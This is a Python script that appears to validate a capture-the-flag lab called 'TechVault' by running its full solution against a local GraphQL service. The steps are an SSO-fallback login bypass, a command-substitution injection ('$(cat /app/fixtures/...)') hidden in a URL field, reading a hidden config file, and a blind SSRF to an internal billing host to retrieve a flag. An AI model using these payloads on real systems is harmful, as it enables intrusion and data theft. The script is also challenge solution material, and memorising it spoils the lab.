#!/usr/bin/env python3
"""TechVault — Automated Challenge Validation."""
import argparse, base64, binascii, sys
import requests

FIXTURE_ENCODED_NAME = "YmlsbGluZy1ndy5jb25m"
EXPECTED_DECODED_NAME = "billing-gw.conf"
EXPECTED_UPSTREAM_HOST = "billing-core.techvault.local"
EXPECTED_ACCOUNT_REF_HEX = "39303432"
EXPECTED_ACCOUNT_ID = "9042"
TARGET_PRODUCT_ID = "LP-2049"

passed = 0
failed = 0

def check(label, condition, detail=""):
    global passed, failed
    if condition:
        passed += 1
        print(f"    PASS  {label}")
        return True
    failed += 1
    print(f"    FAIL  {label}" + (f" — {detail}" if detail else ""))
    return False

def die(msg):
    print(f"\n[!] FATAL: {msg}")
    print(f"\n{'='*60}\nVALIDATION ABORTED  ({passed} passed, {failed} failed)")
    sys.exit(1)

def gql(base, query, token=None, timeout=10):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    r = requests.post(f"{base}/graphql", json={"query": query}, headers=headers, timeout=timeout)
    try:
        body = r.json()
    except ValueError:
        body = {"raw": r.text}
    return r.status_code, body

def first_error(body):
    errs = body.get("errors") or []
    return errs[0].get("message") if errs else None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:4000")
    parser.add_argument("--internal-billing-url", default="http://127.0.0.1:5000")
    args = parser.parse_args()
    base = args.base_url.rstrip("/")

    print("[0] Discover a valid username via public reviews")
    _, body = gql(base, '{ reviews { author comment } }')
    review_authors = {r.get("author") for r in (body.get("data") or {}).get("reviews", [])}
    check("Public reviews expose 'alice' as a real username",
          "alice" in review_authors, f"got authors: {review_authors}")

    print("[1] Health check")
    r = requests.get(f"{base}/health", timeout=5)
    check("Service is up (200 + status ok)",
          r.status_code == 200 and r.json().get("status") == "ok",
          f"got {r.status_code} {r.text}")

    print("[2] Introspection exposes PasswordInput shape")
    _, body = gql(base, '{ __type(name: "PasswordInput") { inputFields { name } } }')
    field_names = set()
    if (body.get("data") or {}).get("__type"):
        field_names = {f["name"] for f in body["data"]["__type"]["inputFields"]}
    check("PasswordInput exposes value/username/ssoProvider fields",
          {"value", "username", "ssoProvider"}.issubset(field_names),
          f"got fields: {field_names}")

    print("[3] Login with wrong plain password is rejected")
    _, body = gql(base, 'mutation { login(username: "alice", password: { value: "wrongpassword" }) { token } }')
    check("Wrong password returns a GraphQL error (no token)",
          (body.get("data") or {}).get("login") in (None, {}) and first_error(body) is not None,
          f"got {body}")

    print("[4] Auth bypass via delegated/SSO fallback")
    _, body = gql(base, '''
      mutation { login(username: "alice", password: { username: "alice" }) {
        token user { id username role } } }
    ''')
    login_data = (body.get("data") or {}).get("login") or {}
    token = login_data.get("token")
    if not check("Bypass login succeeds and returns a token", token is not None, f"got {body}"):
        die("Cannot proceed without a valid session token.")
    check("Returned user is 'alice'",
          login_data.get("user", {}).get("username") == "alice",
          f"got {login_data.get('user')}")

    print("[5] generatePreview: normal, non-injected source")
    _, body = gql(base, 'mutation { generatePreview(sourceUrl: "http://example.com/product-page") { status } }', token=token)
    gp = (body.get("data") or {}).get("generatePreview") or {}
    check("Normal preview completes", gp.get("status") == "COMPLETED", f"got {body}")

    print("[6] generatePreview: naive injection attempt is rejected")
    _, body = gql(base, 'mutation { generatePreview(sourceUrl: "http://x.com; ls /app/fixtures") { status message } }', token=token)
    gp = (body.get("data") or {}).get("generatePreview") or {}
    check("Naive `;` injection is rejected (FAILED status)", gp.get("status") == "FAILED", f"got {body}")
    check("Rejection message is the documented generic filter message",
          gp.get("message") == "Invalid characters in source", f"got {gp.get('message')}")

    print("[7] generatePreview: command-substitution bypass")
    _, body = gql(base, 'mutation { generatePreview(sourceUrl: "http://x.com$(ls /app/fixtures)") { artifactId status } }', token=token)
    gp = (body.get("data") or {}).get("generatePreview") or {}
    ls_artifact_id = gp.get("artifactId")
    check("Bypass payload is accepted (COMPLETED, not FAILED)",
          gp.get("status") == "COMPLETED", f"got {body}")
    if ls_artifact_id is None:
        die("No artifactId returned from the injection step; aborting.")

    print("[8] previewArtifact reveals the 3 fixture filenames")
    _, body = gql(base, f'{{ previewArtifact(id: "{ls_artifact_id}") {{ content }} }}', token=token)
    content = ((body.get("data") or {}).get("previewArtifact") or {}).get("content") or ""
    check("Output lists render_cache.tmp", "render_cache.tmp" in content, f"content={content!r}")
    check("Output lists worker_status.log", "worker_status.log" in content, f"content={content!r}")
    check("Output lists the Base64-named file",
          FIXTURE_ENCODED_NAME in content, f"content={content!r}")

    print("[9] Decoy files contain no exploitable data")
    _, body = gql(base, 'mutation { generatePreview(sourceUrl: "http://x.com$(cat /app/fixtures/render_cache.tmp)") { artifactId } }', token=token)
    decoy1_id = ((body.get("data") or {}).get("generatePreview") or {}).get("artifactId")
    _, body = gql(base, f'{{ previewArtifact(id: "{decoy1_id}") {{ content }} }}', token=token)
    decoy1_content = ((body.get("data") or {}).get("previewArtifact") or {}).get("content") or ""
    check("Decoy #1 contains no hostname/account reference",
          "techvault.local" not in decoy1_content, f"content={decoy1_content!r}")

    print("[10] Decode the Base64 filename and read billing-gw.conf")
    try:
        decoded_name = base64.b64decode(FIXTURE_ENCODED_NAME).decode()
    except (binascii.Error, UnicodeDecodeError):
        decoded_name = None
    check("Filename decodes to billing-gw.conf",
          decoded_name == EXPECTED_DECODED_NAME, f"got {decoded_name!r}")

    _, body = gql(base, f'mutation {{ generatePreview(sourceUrl: "http://x.com$(cat /app/fixtures/{FIXTURE_ENCODED_NAME})") {{ artifactId }} }}', token=token)
    conf_artifact_id = ((body.get("data") or {}).get("generatePreview") or {}).get("artifactId")
    _, body = gql(base, f'{{ previewArtifact(id: "{conf_artifact_id}") {{ content }} }}', token=token)
    conf_content = ((body.get("data") or {}).get("previewArtifact") or {}).get("content") or ""

    check(f"Config reveals upstream host {EXPECTED_UPSTREAM_HOST}",
          EXPECTED_UPSTREAM_HOST in conf_content, f"content={conf_content!r}")
    check(f"Config reveals hex-encoded account_ref {EXPECTED_ACCOUNT_REF_HEX}",
          EXPECTED_ACCOUNT_REF_HEX in conf_content, f"content={conf_content!r}")

    try:
        decoded_account = bytes.fromhex(EXPECTED_ACCOUNT_REF_HEX).decode()
    except ValueError:
        decoded_account = None
    check(f"account_ref hex decodes to {EXPECTED_ACCOUNT_ID}",
          decoded_account == EXPECTED_ACCOUNT_ID, f"got {decoded_account!r}")

    print("[11] fetchCompetitorPrice — blind SSRF against billing-core")
    ssrf_target = (
        f"http://{EXPECTED_UPSTREAM_HOST}:5000/graphql"
        f'?query={{accountBalance(accountId:%22{EXPECTED_ACCOUNT_ID}%22){{notes}}}}'
    )
    _, body = gql(base, f'''
      mutation {{ fetchCompetitorPrice(productId: "{TARGET_PRODUCT_ID}", target: "{ssrf_target}") {{ success }} }}
    ''', token=token)
    fcp = (body.get("data") or {}).get("fetchCompetitorPrice") or {}
    check("SSRF request to billing-core succeeds (success: true)",
          fcp.get("success") is True, f"got {body}")

    print("[12] Isolation: billing-core is unreachable directly")
    try:
        r = requests.get(f"{args.internal_billing_url}/health", timeout=3)
        reachable = r.status_code == 200
    except requests.exceptions.RequestException:
        reachable = False
    check("billing-core does NOT respond to a direct external request",
          not reachable, "billing-core answered directly — isolation is broken!")

    print("[13] myPreviewArtifacts surfaces the new competitor-check artifact")
    _, body = gql(base, '{ myPreviewArtifacts(limit: 5) { id title status } }', token=token)
    artifacts = (body.get("data") or {}).get("myPreviewArtifacts") or []
    match = next((a for a in artifacts if a.get("title", "").startswith("Competitor Check")), None)
    check("A 'Competitor Check' artifact is present", match is not None, f"artifacts={artifacts}")
    if match is None:
        die("No competitor-check artifact found; aborting remaining checks.")

    print("[14] Read the artifact content and confirm the flag")
    _, body = gql(base, f'{{ previewArtifact(id: "{match["id"]}") {{ content }} }}', token=token)
    flag_content = ((body.get("data") or {}).get("previewArtifact") or {}).get("content") or ""
    check("Artifact content contains 'Internal reconciliation flag:'",
          "Internal reconciliation flag:" in flag_content, f"content={flag_content!r}")

    flag = None
    if "duck{" in flag_content:
        start = flag_content.index("duck{")
        end = flag_content.index("}", start) + 1
        flag = flag_content[start:end]
    check("Flag has the expected format (duck{...})",
          flag is not None and flag.startswith("duck{") and flag.endswith("}"),
          f"got {flag!r}")

    print("[15] IDOR check: artifact cannot be read by a non-owning session")
    _, body = gql(base, 'mutation { login(username: "support_bot", password: { username: "support_bot" }) { token } }')
    other_token = ((body.get("data") or {}).get("login") or {}).get("token")
    if other_token:
        _, body = gql(base, f'{{ previewArtifact(id: "{match["id"]}") {{ content }} }}', token=other_token)
        leaked = (body.get("data") or {}).get("previewArtifact")
        check("A different user's session cannot read alice's artifact (null)",
              leaked is None, f"got {leaked}")
    else:
        print("    SKIP  (support_bot bypass login unavailable in this build)")

    print(f"\n{'='*60}")
    if flag:
        print(f"Flag obtained: {flag}")
    if failed == 0:
        print(f"ALL CHECKS PASSED ({passed}/{passed})")
        sys.exit(0)
    else:
        print(f"CHECKS FAILED ({failed} failed, {passed} passed)")
        sys.exit(1)

if __name__ == "__main__":
    main()
